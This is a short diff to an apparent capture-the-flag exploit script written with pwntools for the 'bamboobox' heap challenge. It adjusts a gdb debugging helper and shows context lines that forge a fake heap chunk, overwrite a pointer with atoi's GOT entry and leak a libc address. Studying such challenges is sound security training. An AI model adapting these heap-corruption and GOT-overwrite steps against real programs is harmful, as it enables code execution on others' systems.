@@ -15,9 +15,9 @@ io = process("./bamboobox")
 elf = ELF("./bamboobox")
 libc = elf.libc
 
-def DEBUG():
-	raw_input("DEBUG: ")
-	gdb.attach(io)
+def DEBUG(cmd = ""):
+    raw_input("DEBUG: ")
+    gdb.attach(io, cmd)
 
 def show():
     io.sendlineafter(":", "1")
@@ -51,6 +51,7 @@ if __name__ == "__main__":
     change(0, 0x80, fakeChunk)
     remove(1)
     payload = flat([0, 0, 0x40, elf.got['atoi']])
+    #  DEBUG("b *change_item\nc")
     change(0, 0x80, payload)
     show()
     libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\x00')) - libc.sym['atoi']
